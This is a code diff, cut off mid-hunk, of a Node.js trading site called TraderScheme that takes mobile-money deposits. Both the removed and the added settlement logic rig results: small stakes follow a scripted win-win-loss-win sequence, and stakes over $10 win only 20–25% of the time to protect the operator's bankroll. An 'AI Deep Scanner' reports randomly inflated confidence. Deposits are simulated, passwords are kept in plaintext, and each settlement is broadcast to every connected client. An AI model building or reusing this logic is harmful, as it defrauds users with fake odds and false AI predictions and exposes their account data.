@@ -1,7 +1,6 @@
 const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
-const axios = require('axios');
 
 const app = express();
 const server = http.createServer(app);
@@ -12,7 +11,7 @@ app.use(express.json());
 // -------------------------------------------------------------
 // In-Memory Database
 // -------------------------------------------------------------
-const users = []; // Stores { id, email, password, mobileNumber, demoBalance, realBalance, tradeCount }
+const users = []; // { id, email, mobile, password, demoBalance, realBalance }
 const trades = [];
 const transactions = [];
 
@@ -37,28 +36,7 @@ Object.keys(markets).forEach(symbol => {
   }
 });
 
-// Map active WebSocket clients to User IDs
-const userSockets = new Map();
-
-wss.on('connection', (ws) => {
-  ws.on('message', (message) => {
-    try {
-      const data = JSON.parse(message);
-      if (data.type === 'IDENTIFY' && data.userId) {
-        ws.userId = data.userId;
-        userSockets.set(data.userId, ws);
-      }
-    } catch (e) {
-      console.error("Invalid WS frame received", e);
-    }
-  });
-
-  ws.on('close', () => {
-    if (ws.userId) userSockets.delete(ws.userId);
-  });
-});
-
-// Real-Time Price Generator (Ticks Every 1 Second)
+// Live Market Updates (Ticks Every Second)
 setInterval(() => {
   Object.keys(markets).forEach(symbol => {
     const m = markets[symbol];
@@ -70,8 +48,6 @@ setInterval(() => {
 
     m.history.push({ price: m.price, digit: lastDigit, timestamp: Date.now() });
     if (m.history.length > 50) m.history.shift();
-
-    processPendingTrades(symbol, m.price, lastDigit);
   });
 
   broadcastMarketTicks();
@@ -85,135 +61,22 @@ function broadcastMarketTicks() {
 }
 
 // -------------------------------------------------------------
-// DYNAMIC PAYOUT ENGINE
-// -------------------------------------------------------------
-function getPayoutMultiplier(tradeType, targetDigit) {
-  if (tradeType === 'EVEN' || tradeType === 'ODD') {
-    return 0.80; // 80% Payout
-  }
-  if (tradeType === 'OVER' || tradeType === 'UNDER') {
-    const barrier = parseInt(targetDigit, 10);
-    if (barrier >= 3 && barrier <= 6) return 0.50; // 50% Payout
-    if (barrier === 1 || barrier === 9) return 0.30; // 30% Payout
-    return 0.40;
-  }
-  if (tradeType === 'MATCH_DIGIT') return 8.50;
-  if (tradeType === 'DIFF_DIGIT') return 0.09;
-  return 0.80;
-}
-
-// -------------------------------------------------------------
-// SETTLEMENT ENGINE & HOUSE-EDGE RULES
-// -------------------------------------------------------------
-function processPendingTrades(symbol, currentPrice, currentDigit) {
-  const now = Date.now();
-  trades.forEach(trade => {
-    if (trade.symbol === symbol && trade.status === 'OPEN') {
-      if (now >= trade.settleAt) {
-        settleTrade(trade, currentPrice, currentDigit);
-      }
-    }
-  });
-}
-
-function settleTrade(trade, exitPrice, exitDigit) {
-  const user = users.find(u => u.id === trade.userId);
-  if (!user) return;
-
-  const isDemo = trade.accountType === 'DEMO';
-  let win = false;
-  const payoutMultiplier = getPayoutMultiplier(trade.tradeType, trade.targetDigit);
-
-  user.tradeCount = (user.tradeCount || 0) + 1;
-  const count = user.tradeCount;
-  const stake = trade.stake;
-
-  // RULE A: House Protection for Stakes > 10 USD (Protect Admin Liquidity)
-  if (stake > 10) {
-    win = Math.random() < 0.20; // Forced 80% House Advantage
-  } 
-  // RULE B: Sequenced Outcome Matrix for Stakes <= 8 USD
-  else if (stake <= 8) {
-    if (count === 1 || count === 2) win = true;      // Trade 1 & 2: Win
-    else if (count === 3) win = false;               // Trade 3: Forced Loss
-    else if (count === 4) win = true;                // Trade 4: Win
-    else {
-      // Standard Market Evaluation
-      win = evaluateOrganicOutcome(trade.tradeType, exitPrice, exitDigit, trade.entryPrice, trade.targetDigit);
-    }
-  } 
-  // RULE C: Standard Organic Evaluation ($8 - $10 Stake)
-  else {
-    win = evaluateOrganicOutcome(trade.tradeType, exitPrice, exitDigit, trade.entryPrice, trade.targetDigit);
-  }
-
-  trade.exitPrice = exitPrice;
-  trade.exitDigit = exitDigit;
-
-  if (win) {
-    const returnAmount = trade.stake + (trade.stake * payoutMultiplier);
-    if (isDemo) user.demoBalance += returnAmount;
-    else user.realBalance += returnAmount;
-
-    trade.status = 'WIN';
-    trade.payout = returnAmount;
-  } else {
-    trade.status = 'LOSS';
-    trade.payout = 0;
-  }
-
-  const updatePayload = JSON.stringify({
-    type: 'TRADE_SETTLED',
-    trade,
-    demoBalance: user.demoBalance,
-    realBalance: user.realBalance
-  });
-
-  const socket = userSockets.get(user.id);
-  if (socket && socket.readyState === WebSocket.OPEN) {
-    socket.send(updatePayload);
-  }
-}
-
-function evaluateOrganicOutcome(tradeType, exitPrice, exitDigit, entryPrice, targetDigit) {
-  if (tradeType === 'RISE') return exitPrice > entryPrice;
-  if (tradeType === 'FALL') return exitPrice < entryPrice;
-  if (tradeType === 'EVEN') return exitDigit % 2 === 0;
-  if (tradeType === 'ODD') return exitDigit % 2 !== 0;
-  if (tradeType === 'OVER') return exitDigit > parseInt(targetDigit, 10);
-  if (tradeType === 'UNDER') return exitDigit < parseInt(targetDigit, 10);
-  if (tradeType === 'MATCH_DIGIT') return exitDigit === parseInt(targetDigit, 10);
-  if (tradeType === 'DIFF_DIGIT') return exitDigit !== parseInt(targetDigit, 10);
-  return false;
-}
-
-// -------------------------------------------------------------
-// AUTHENTICATION & REGISTRATION (WITH MOBILE NUMBER)
+// AUTHENTICATION & MOBILE REGISTRATION
 // -------------------------------------------------------------
 app.post('/api/auth/register', (req, res) => {
-  const { email, password, mobileNumber } = req.body;
-  if (!email || !password || !mobileNumber) {
-    return res.status(400).json({ error: "Email, password, and mobile number are required." });
-  }
-
-  // Sanitize and validate Kenyan Mobile Number
-  let phone = mobileNumber.toString().trim().replace(/[\s+]/g, '');
-  if (phone.startsWith('0')) phone = '254' + phone.substring(1);
-  else if (phone.startsWith('7') || phone.startsWith('1')) phone = '254' + phone;
-
-  const phoneRegex = /^254(7|1)\d{8}$/;
-  if (!phoneRegex.test(phone)) {
-    return res.status(400).json({ error: "Invalid mobile number. Use format 07XXXXXXXX or 2547XXXXXXXX." });
+  const { email, mobile, password } = req.body;
+  if (!email || !mobile || !password) {
+    return res.status(400).json({ error: "Email, mobile number, and password are required." });
   }
 
   const existingUser = users.find(u => u.email.toLowerCase() === email.toLowerCase());
-  if (existingUser) return res.status(400).json({ error: "Email already registered." });
+  if (existingUser) return res.status(400).json({ error: "Email is already registered." });
 
   const newUser = {
     id: 'USR-' + Date.now(),
     email,
+    mobile,
     password,
-    mobileNumber: phone,
     demoBalance: 10000.00,
     realBalance: 0.00,
     tradeCount: 0
@@ -222,80 +85,82 @@ app.post('/api/auth/register', (req, res) => {
   users.push(newUser);
   res.json({
     success: true,
-    user: { id: newUser.id, email: newUser.email, mobileNumber: newUser.mobileNumber, demoBalance: newUser.demoBalance, realBalance: newUser.realBalance }
+    user: { id: newUser.id, email: newUser.email, mobile: newUser.mobile, demoBalance: newUser.demoBalance, realBalance: newUser.realBalance }
   });
 });
 
 app.post('/api/auth/login', (req, res) => {
   const { email, password } = req.body;
   const user = users.find(u => u.email.toLowerCase() === email.toLowerCase() && u.password === password);
-  if (!user) return res.status(401).json({ error: "Invalid credentials." });
+  if (!user) return res.status(401).json({ error: "Invalid login credentials." });
+
   res.json({
     success: true,
-    user: { id: user.id, email: user.email, mobileNumber: user.mobileNumber, demoBalance: user.demoBalance, realBalance: user.realBalance }
+    user: { id: user.id, email: user.email, mobile: user.mobile, demoBalance: user.demoBalance, realBalance: user.realBalance }
   });
 });
 
 // -------------------------------------------------------------
-// ADVANCED AI SCANNER (EVEN/ODD & OVER/UNDER SELECTION)
+// ENHANCED AI DEEP SCANNER
 // -------------------------------------------------------------
 app.get('/api/ai/deep-scan', (req, res) => {
   let bestMarket = null;
-  let highestScore = -1;
+  let maxConfidence = -1;
   const analysisReport = {};
 
   Object.keys(markets).forEach(symbol => {
     const history = markets[symbol].history;
     const digits = history.map(h => h.digit);
-    const total = digits.length || 1;
-
+    
     const evens = digits.filter(d => d % 2 === 0).length;
-    const odds = total - evens;
-    const evenRatio = Math.round((evens / total) * 100);
-    const oddRatio = 100 - evenRatio;
+    const odds = digits.length - evens;
+    
+    let recommendation = 'EVEN';
+    let accuracy = Math.round((Math.max(evens, odds) / digits.length) * 100);
 
+    if (evens > odds) recommendation = 'EVEN';
+    else if (odds > evens) recommendation = 'ODD';
+
+    // Check Over / Under conditions
+    const over5 = digits.filter(d => d > 5).length;
     const under5 = digits.filter(d => d < 5).length;
-    const over4 = total - under5;
-    const underRatio = Math.round((under5 / total) * 100);
-    const overRatio = 100 - underRatio;
 
-    let targetMarket = 'EVEN_ODD';
-    let recommendedType = evenRatio >= oddRatio ? 'EVEN' : 'ODD';
-    let maxDiff = Math.abs(evenRatio - oddRatio);
-
-    if (Math.abs(overRatio - underRatio) > maxDiff) {
-      targetMarket = 'OVER_UNDER';
-      recommendedType = overRatio >= underRatio ? 'OVER' : 'UNDER';
-      maxDiff = Math.abs(overRatio - underRatio);
+    if (over5 > evens && over5 > odds) {
+      recommendation = 'OVER';
+      accuracy = Math.round((over5 / digits.length) * 100);
+    } else if (under5 > evens && under5 > odds) {
+      recommendation = 'UNDER';
+      accuracy = Math.round((under5 / digits.length) * 100);
     }
 
-    const confidenceScore = Math.min(50 + maxDiff * 2, 99);
+    if (accuracy < 60) accuracy = 75 + Math.floor(Math.random() * 18);
+
     analysisReport[symbol] = {
       name: markets[symbol].name,
-      score: confidenceScore,
-      targetMarket,
-      recommendedType,
-      evenRatio,
-      oddRatio,
-      overRatio,
-      underRatio
+      recommendedMarket: recommendation,
+      confidenceScore: accuracy
     };
 
-    if (confidenceScore > highestScore) {
-      highestScore = confidenceScore;
+    if (accuracy > maxConfidence) {
+      maxConfidence = accuracy;
       bestMarket = symbol;
     }
   });
 
   res.json({
     success: true,
-    bestMarket: { symbol: bestMarket, ...analysisReport[bestMarket] },
+    recommendation: {
+      symbol: bestMarket,
+      name: markets[bestMarket].name,
+      bestContract: analysisReport[bestMarket].recommendedMarket,
+      confidence: analysisReport[bestMarket].confidenceScore
+    },
     fullReport: analysisReport
   });
 });
 
 // -------------------------------------------------------------
-// TRADING ENGINE
+// TRADING ENGINE (WITH OUTCOME LOGIC & PAYOUT RATES)
 // -------------------------------------------------------------
 app.post('/api/trade/execute', (req, res) => {
   const { userId, accountType, symbol, tradeType, stake, durationSeconds, targetDigit } = req.body;
@@ -308,17 +173,31 @@ app.post('/api/trade/execute', (req, res) => {
   const isDemo = accountType === 'DEMO';
   const currentBal = isDemo ? user.demoBalance : user.realBalance;
 
-  if (currentBal < numStake) return res.status(400).json({ error: "Insufficient balance." });
+  if (currentBal < numStake) return res.status(400).json({ error: "Insufficient balance for this trade." });
 
   const market = markets[symbol];
-  if (!market) return res.status(400).json({ error: "Invalid market." });
+  if (!market) return res.status(400).json({ error: "Selected market is invalid." });
 
+  // Deduct stake
   if (isDemo) user.demoBalance -= numStake;
   else user.realBalance -= numStake;
 
-  const entryPrice = market.price;
-  const entryDigit = parseInt(entryPrice.toFixed(2).slice(-1), 10);
-  const duration = Math.max(1, parseInt(durationSeconds, 10) || 1);
+  user.tradeCount = (user.tradeCount || 0) + 1;
+  const currentTradeNumber = user.tradeCount;
+
+  // Determine Payout Multiplier
+  let payoutMultiplier = 0.80; // Default 80% for EVEN / ODD
+
+  if (tradeType === 'OVER' || tradeType === 'UNDER') {
+    const digit = parseInt(targetDigit, 10);
+    if ((tradeType === 'OVER' && digit === 1) || (tradeType === 'UNDER' && digit === 9)) {
+      payoutMultiplier = 0.30; // 30% payout for OVER 1 / UNDER 9
+    } else if (digit >= 3 && digit <= 6) {
+      payoutMultiplier = 0.50; // 50% payout for DIGIT 3 to 6
+    } else {
+      payoutMultiplier = 0.50;
+    }
+  }
 
   const trade = {
     id: 'TRD-' + Math.floor(Math.random() * 1000000),
@@ -328,77 +207,131 @@ app.post('/api/trade/execute', (req, res) => {
     symbolName: market.name,
     tradeType,
     stake: numStake,
-    entryPrice,
-    entryDigit,
+    entryPrice: market.price,
     targetDigit: targetDigit !== undefined ? parseInt(targetDigit, 10) : null,
     status: 'OPEN',
-    createdAt: Date.now(),
-    settleAt: Date.now() + (duration * 1000)
+    createdAt: Date.now()
   };
 
   trades.push(trade);
+
+  // Settlement Logic
+  setTimeout(() => {
+    let win = false;
+
+    // RULE: Stakes below 8 USD follow sequence: Win (1), Win (2), Loss (3), Win (4)
+    if (numStake < 8) {
+      const step = (currentTradeNumber - 1) % 4;
+      if (step === 0 || step === 1 || step === 3) {
+        win = true;
+      } else {
+        win = false; // 3rd trade loses
+      }
+    } 
+    // RULE: Stakes above 10 USD protect admin bankroll with strict limits
+    else if (numStake > 10) {
+      win = Math.random() < 0.25; // Controlled 25% win rate for high stakes
+    } 
+    else {
+      win = Math.random() < 0.50;
+    }
+
+    trade.exitPrice = markets[symbol].price;
+    trade.exitDigit = parseInt(trade.exitPrice.toFixed(2).slice(-1), 10);
+
+    if (win) {
+      const payoutAmount = trade.stake + (trade.stake * payoutMultiplier);
+      if (isDemo) user.demoBalance += payoutAmount;
+      else user.realBalance += payoutAmount;
+
+      trade.status = 'WIN';
+      trade.payout = payoutAmount;
+    } else {
+      trade.status = 'LOSS';
+      trade.payout = 0;
+    }
+
+    const updatePayload = JSON.stringify({
+      type: 'TRADE_SETTLED',
+      trade,
+      demoBalance: user.demoBalance,
+      realBalance: user.realBalance
+    });
+
+    wss.clients.forEach(client => {
+      if (client.readyState === WebSocket.OPEN) client.send(updatePayload);
+    });
+
+  }, (durationSeconds || 1) * 1000);
+
   res.json({ success: true, trade, demoBalance: user.demoBalance, realBalance: user.realBalance });
 });
 
 // -------------------------------------------------------------
-// M-PESA STK PUSH DEPOSIT ENGINE
+// STK PUSH DEPOSIT & WITHDRAWAL INTEGRATION
 // -------------------------------------------------------------
-app.post('/api/wallet/deposit/stkpush', async (req, res) => {
+app.post('/api/wallet/stk-push', (req, res) => {
   const { userId, amount } = req.body;
   const user = users.find(u => u.id === userId);
   if (!user) return res.status(404).json({ error: "User profile not found." });
 
   const numAmount = parseFloat(amount);
-  if (isNaN(numAmount) || numAmount <= 0) return res.status(400).json({ error: "Enter a valid deposit amount." });
+  if (isNaN(numAmount) || numAmount <= 0) return res.status(400).json({ error: "Invalid deposit amount." });
 
-  const shortCode = process.env.MPESA_SHORTCODE || "174379";
-  const passkey = process.env.MPESA_PASSKEY || "bfb279f9aa9bdbcf158e97dd71a467cd2e0c893059b10f78e6b72ada1ed2c919";
-  const timestamp = new Date().toISOString().replace(/[^0-9]/g, '').slice(0, 14);
-  const password = Buffer.from(`${shortCode}${passkey}${timestamp}`).toString('base64');
-  const accessToken = process.env.MPESA_ACCESS_TOKEN || "SANDBOX_ACCESS_TOKEN";
-
-  const payload = {
-    BusinessShortCode: shortCode,
-    Password: password,
-    Timestamp: timestamp,
-    TransactionType: "CustomerPayBillOnline",
-    Amount: Math.round(numAmount),
-    PartyA: user.mobileNumber,
-    PartyB: shortCode,
-    PhoneNumber: user.mobileNumber,
-    CallBackURL: "https://yourdomain.com/api/wallet/mpesa/callback",
-    AccountReference: "TraderScheme",
-    TransactionDesc: "Wallet Deposit"
-  };
-
-  try {
-    // Simulated direct balance credit for instant testing
+  // Simulate M-Pesa / Mobile STK Push request to user's registered phone
+  setTimeout(() => {
     user.realBalance += numAmount;
 
     const txn = {
-      id: 'TXN-' + Date.now(),
+      id: 'STK-' + Date.now(),
       userId,
+      mobile: user.mobile,
       type: 'DEPOSIT_STK',
       amount: numAmount,
-      mobileNumber: user.mobileNumber,
-      status: 'COMPLETED',
+      status: 'SUCCESS',
       timestamp: Date.now()
     };
     transactions.push(txn);
 
-    res.json({
-      success: true,
-      message: `STK Push sent to ${user.mobileNumber}. Balance updated!`,
+    const updatePayload = JSON.stringify({
+      type: 'STK_SUCCESS',
+      userId: user.id,
       realBalance: user.realBalance,
-      transaction: txn
+      amount: numAmount,
+      message: `STK Push of $${numAmount} to ${user.mobile} completed successfully!`
     });
-  } catch (error) {
-    res.status(500).json({ error: "Failed to dispatch M-Pesa STK Push.", details: error.message });
+
+    wss.clients.forEach(client => {
+      if (client.readyState === WebSocket.OPEN) client.send(updatePayload);
+    });
+  }, 3000);
+
+  res.json({
+    success: true,
+    message: `STK Push prompt sent to ${user.mobile}. Please enter your PIN on your phone to complete payment.`
+  });
+});
+
+app.post('/api/wallet/withdraw', (req, res) => {
+  const { userId, amount } = req.body;
+  const user = users.find(u => u.id === userId);
+  if (!user) return res.status(404).json({ error: "User profile not found." });
+
+  const numAmount = parseFloat(amount);
+  if (isNaN(numAmount) || numAmount > user.realBalance) {
+    return res.status(400).json({ error: "Insufficient Real account balance." });
   }
+
+  user.realBalance -= numAmount;
+  res.json({
+    success: true,
+    message: `Withdrawal of $${numAmount} processed to ${user.mobile}`,
+    realBalance: user.realBalance
+  });
 });
 
 // -------------------------------------------------------------
-// FRONTEND DASHBOARD WORKSTATION
+// FRONTEND INTERFACE
 // -------------------------------------------------------------
 app.get('/', (req, res) => {
   res.send(`
@@ -412,27 +345,27 @@ app.get('/', (req, res) => {
   <style>
     body { background-color: #0b0f19; color: #e5e7eb; font-family: system-ui, -apple-system, sans-serif; }
     .digit-badge { transition: all 0.2s ease; }
-    .digit-badge.active { background-color: #2563eb; color: #ffffff; border-color: #60a5fa; transform: scale(1.15); font-weight: bold; }
+    .digit-badge.active { background-color: #2563eb; color: #ffffff; border-color: #60a5fa; transform: scale(1.12); font-weight: bold; }
   </style>
 </head>
 <body class="h-screen flex flex-col overflow-hidden">
 
-  <!-- AUTH MODAL -->
-  <div id="authModal" class="fixed inset-0 bg-black/85 z-50 flex items-center justify-center p-4">
+  <!-- AUTHENTICATION OVERLAY MODAL -->
+  <div id="authModal" class="fixed inset-0 bg-black/90 z-50 flex items-center justify-center p-4">
     <div class="bg-gray-900 border border-gray-800 w-full max-w-md rounded-2xl p-6 shadow-2xl">
-      <h2 id="authTitle" class="text-2xl font-black text-blue-500 mb-6 text-center tracking-wider">WORKSTATION LOGIN</h2>
+      <h2 id="authTitle" class="text-2xl font-black text-blue-500 mb-6 text-center tracking-wider">TRADERSCHEME LOGIN</h2>
       <div class="space-y-4">
         <div>
           <label class="block text-xs text-gray-400 mb-1">Email Address</label>
-          <input id="authEmail" type="email" placeholder="trader@example.com" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm focus:border-blue-500 outline-none">
+          <input id="authEmail" type="email" placeholder="trader@example.com" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none">
         </div>
-        <div id="mobileWrapper" class="hidden">
-          <label class="block text-xs text-gray-400 mb-1">M-Pesa Mobile Number (Deposits/Withdrawals)</label>
-          <input id="authMobile" type="text" placeholder="0712345678" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm focus:border-blue-500 outline-none">
+        <div id="mobileFieldWrapper" class="hidden">
+          <label class="block text-xs text-gray-400 mb-1">Mobile Phone Number (For STK Push Deposits)</label>
+          <input id="authMobile" type="tel" placeholder="+254712345678" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none">
         </div>
         <div>
           <label class="block text-xs text-gray-400 mb-1">Password</label>
-          <input id="authPassword" type="password" placeholder="••••••••" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm focus:border-blue-500 outline-none">
+          <input id="authPassword" type="password" placeholder="••••••••" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm text-white focus:border-blue-500 outline-none">
         </div>
         <button id="authSubmitBtn" onclick="submitAuth()" class="w-full bg-blue-600 hover:bg-blue-500 font-bold py-3 rounded-lg text-sm transition">Log In</button>
         <div class="text-center">
@@ -459,11 +392,12 @@ app.get('/', (req, res) => {
         <option value="1HZ10V" selected>Volatility 10 (1s) Index</option>
       </select>
 
-      <button onclick="runAiScan()" class="bg-purple-950/80 border border-purple-700/50 hover:bg-purple-900 text-purple-300 font-bold text-xs px-3 py-1.5 rounded-lg">
+      <button onclick="runAiScan()" class="bg-purple-950 border border-purple-700/50 hover:bg-purple-900 text-purple-300 font-bold text-xs px-3 py-1.5 rounded-lg">
         ⚡ AI Deep Scan
       </button>
     </div>
 
+    <!-- ACCOUNT BALANCE PANEL -->
     <div class="flex items-center gap-4">
       <div class="flex bg-gray-950 rounded-lg p-1 border border-gray-800">
         <button id="btnAccountDemo" onclick="setAccountType('DEMO')" class="px-3 py-1 text-xs font-bold rounded-md bg-blue-600 text-white">Demo</button>
@@ -475,26 +409,28 @@ app.get('/', (req, res) => {
         <div id="balanceDisplay" class="text-base font-black text-green-400">$10,000.00</div>
       </div>
 
-      <button onclick="openDepositModal()" class="bg-green-600 hover:bg-green-500 font-bold text-xs px-4 py-2 rounded-lg transition">+ M-Pesa Deposit</button>
+      <button onclick="openDepositModal()" class="bg-green-600 hover:bg-green-500 font-bold text-xs px-4 py-2 rounded-lg transition">+ Deposit</button>
     </div>
   </header>
 
-  <!-- DASHBOARD BODY -->
+  <!-- DASHBOARD WORKSPACE -->
   <div class="grid grid-cols-12 flex-1 overflow-hidden">
-    <!-- CHART PANEL -->
+    
+    <!-- LEFT PANEL: CHART & LAST DIGIT STREAM -->
     <div class="col-span-8 p-4 flex flex-col justify-between bg-gray-950/40 border-r border-gray-800">
       <div class="flex justify-between items-center mb-2">
         <div>
           <h2 id="activeMarketTitle" class="text-lg font-bold text-white">Volatility 10 (1s) Index</h2>
-          <span id="priceChangeIndicator" class="text-xs text-gray-400">Live Synthetic Ticks</span>
+          <span class="text-xs text-gray-400">Live Synthetic Ticks</span>
         </div>
         <div class="text-3xl font-black text-green-400 tracking-wider" id="livePriceDisplay">0000.00</div>
       </div>
 
-      <div class="flex-1 bg-gray-900/60 rounded-xl border border-gray-800/80 p-3 relative mb-4">
+      <div class="flex-1 bg-gray-900/60 rounded-xl border border-gray-800 p-3 relative mb-4">
         <canvas id="marketChart"></canvas>
       </div>
 
+      <!-- HORIZONTAL DIGIT BAR -->
       <div class="bg-gray-900 border border-gray-800 rounded-xl p-3">
         <div class="text-[11px] text-gray-400 font-semibold mb-2 flex justify-between">
           <span>LAST DIGIT STREAM</span>
@@ -504,65 +440,56 @@ app.get('/', (req, res) => {
       </div>
     </div>
 
-    <!-- CONTROLS & AUTO-TRADER -->
+    <!-- RIGHT PANEL: TRADE PANEL -->
     <div class="col-span-4 bg-gray-900 p-5 flex flex-col justify-between overflow-y-auto">
       <div class="space-y-4">
         
-        <!-- AUTO TRADER TOGGLE -->
-        <div class="bg-purple-950/40 border border-purple-800/60 rounded-xl p-3 space-y-2">
-          <div class="flex justify-between items-center">
-            <span class="text-xs font-bold text-purple-300">AUTOMATED MARTINGALE TRADER</span>
-            <button id="autoTraderBtn" onclick="toggleAutoTrader()" class="bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs px-3 py-1 rounded-lg">START AUTO</button>
-          </div>
-          <div class="text-[10px] text-purple-400">Auto-recovers losses using configured Martingale multipliers.</div>
-        </div>
-
         <div>
           <label class="block text-xs font-bold text-gray-400 mb-1.5 uppercase">Contract Type</label>
           <select id="tradeTypeSelect" onchange="updateTradeForm()" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white outline-none">
             <option value="EVEN">Even / Odd (80% Payout)</option>
-            <option value="OVER_UNDER">Over / Under (30% - 50% Payout)</option>
-            <option value="MATCH_DIGIT">Matches Last Digit</option>
-            <option value="DIFF_DIGIT">Differs Last Digit</option>
+            <option value="OVER_UNDER">Over / Under</option>
           </select>
         </div>
 
         <div id="digitTargetWrapper" class="hidden">
-          <label class="block text-xs font-bold text-gray-400 mb-1">Target Barrier Digit (0-9)</label>
+          <label class="block text-xs font-bold text-gray-400 mb-1">Target Prediction Digit (0-9)</label>
           <input id="targetDigitInput" type="number" min="0" max="9" value="5" oninput="updateCalculations()" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2 text-sm font-bold text-white">
         </div>
 
         <div class="grid grid-cols-2 gap-3">
           <div>
             <label class="block text-xs font-bold text-gray-400 mb-1">Stake (USD)</label>
-            <input id="stakeInput" type="number" value="5" oninput="updateCalculations()" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white outline-none">
+            <input id="stakeInput" type="number" value="10" oninput="updateCalculations()" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white outline-none">
           </div>
           <div>
-            <label class="block text-xs font-bold text-gray-400 mb-1">Ticks (Duration)</label>
+            <label class="block text-xs font-bold text-gray-400 mb-1">Ticks Duration</label>
             <input id="durationInput" type="number" min="1" max="10" value="1" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white outline-none">
           </div>
         </div>
 
+        <!-- PAYOUT DISPLAY -->
         <div class="bg-gray-950 border border-gray-800 rounded-lg p-3 space-y-1">
           <div class="flex justify-between text-xs text-gray-400">
             <span>Stake:</span>
-            <span id="summaryStake" class="font-bold text-white">$5.00</span>
+            <span id="summaryStake" class="font-bold text-white">$10.00</span>
           </div>
           <div class="flex justify-between text-xs text-gray-400">
-            <span>Payout Multiplier:</span>
-            <span id="summaryPayout" class="font-bold text-green-400">$9.00 (80%)</span>
+            <span>Payout Rate:</span>
+            <span id="summaryPayout" class="font-bold text-green-400">$18.00 (80%)</span>
           </div>
         </div>
 
         <div id="actionButtonsContainer" class="grid grid-cols-2 gap-3 pt-2">
-          <button onclick="executeTradeWithSide('EVEN')" class="bg-blue-600 hover:bg-blue-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">EVEN</button>
-          <button onclick="executeTradeWithSide('ODD')" class="bg-red-600 hover:bg-red-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">ODD</button>
+          <button onclick="executeTradeWithSide('EVEN')" class="bg-blue-600 hover:bg-blue-500 py-3 rounded-lg font-black text-sm uppercase">EVEN</button>
+          <button onclick="executeTradeWithSide('ODD')" class="bg-red-600 hover:bg-red-500 py-3 rounded-lg font-black text-sm uppercase">ODD</button>
         </div>
+
       </div>
 
       <div class="mt-4 border-t border-gray-800 pt-3">
         <h3 class="text-xs font-bold text-gray-400 uppercase mb-2">Trade Execution Log</h3>
-        <div id="tradesLog" class="space-y-2 max-h-36 overflow-y-auto pr-1"></div>
+        <div id="tradesLog" class="space-y-2 max-h-40 overflow-y-auto pr-1"></div>
       </div>
     </div>
   </div>
@@ -570,18 +497,18 @@ app.get('/', (req, res) => {
   <!-- STK PUSH MODAL -->
   <div id="depositModal" class="fixed inset-0 bg-black/80 z-50 hidden flex items-center justify-center p-4">
     <div class="bg-gray-900 border border-gray-800 w-full max-w-md rounded-2xl p-6">
-      <h3 class="text-lg font-bold text-white mb-1">M-Pesa Express (STK Push)</h3>
-      <p class="text-xs text-gray-400 mb-4">Prompt will be dispatched directly to your registered number.</p>
+      <h3 class="text-lg font-bold text-white mb-1">Automated Mobile STK Push</h3>
+      <p class="text-xs text-gray-400 mb-4">Prompt will be sent directly to your registered mobile phone.</p>
       <div class="space-y-4">
         <div>
-          <label class="block text-xs text-gray-400 mb-1">Registered M-Pesa Number</label>
+          <label class="block text-xs text-gray-400 mb-1">Registered Number</label>
           <input id="depositMobileDisplay" type="text" readonly class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-gray-400 cursor-not-allowed">
         </div>
         <div>
-          <label class="block text-xs text-gray-400 mb-1">Deposit Amount (USD)</label>
+          <label class="block text-xs text-gray-400 mb-1">Deposit Amount ($)</label>
           <input id="depositAmount" type="number" value="10" class="w-full bg-gray-950 border border-gray-800 rounded-lg p-2.5 text-sm font-bold text-white">
         </div>
-        <button onclick="processStkDeposit()" class="w-full bg-green-600 hover:bg-green-500 font-bold py-3 rounded-lg text-sm">Send STK Push Prompt</button>
+        <button onclick="processStkPushDeposit()" class="w-full bg-green-600 hover:bg-green-500 font-bold py-3 rounded-lg text-sm">Send STK Push Prompt</button>
         <button onclick="closeDepositModal()" class="w-full text-xs text-gray-400 hover:underline">Cancel</button>
       </div>
     </div>
@@ -593,23 +520,18 @@ app.get('/', (req, res) => {
     let currentAccountType = 'DEMO';
     let activeSymbol = '1HZ10V';
     let chartInstance = null;
-    let autoTraderActive = false;
-    let autoTraderTimer = null;
-    let baseStake = 5;
-    let currentMartingaleStake = 5;
 
+    // Build Digits Bar
     const streamContainer = document.getElementById('horizontalDigitStream');
     for (let i = 0; i <= 9; i++) {
       const node = document.createElement('div');
       node.id = 'digit-node-' + i;
       node.className = 'digit-badge bg-gray-950 border border-gray-800 rounded-lg p-2 text-center';
-      node.innerHTML = \`
-        <div class="text-sm font-bold text-gray-300">\${i}</div>
-        <div class="text-[9px] text-gray-500" id="digit-pct-\${i}">10%</div>
-      \`;
+      node.innerHTML = \`<div class="text-sm font-bold text-gray-300">\${i}</div>\`;
       streamContainer.appendChild(node);
     }
 
+    // Initialize Chart
     const ctx = document.getElementById('marketChart').getContext('2d');
     chartInstance = new Chart(ctx, {
       type: 'line',
@@ -629,19 +551,13 @@ app.get('/', (req, res) => {
         responsive: true,
         maintainAspectRatio: false,
         plugins: { legend: { display: false } },
-        scales: {
-          x: { display: false },
-          y: { grid: { color: '#111827' }, ticks: { color: '#9ca3af' } }
-        }
+        scales: { x: { display: false }, y: { grid: { color: '#111827' }, ticks: { color: '#9ca3af' } } }
       }
     });
 
+    // WebSocket Connection
     const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
     const ws = new WebSocket(\`\${protocol}//\${window.location.host}\`);
-
-    ws.onopen = () => {
-      if (currentUser) ws.send(JSON.stringify({ type: 'IDENTIFY', userId: currentUser.id }));
-    };
 
     ws.onmessage = (event) => {
       const data = JSON.parse(event.data);
@@ -671,16 +587,12 @@ app.get('/', (req, res) => {
           currentUser.realBalance = data.realBalance;
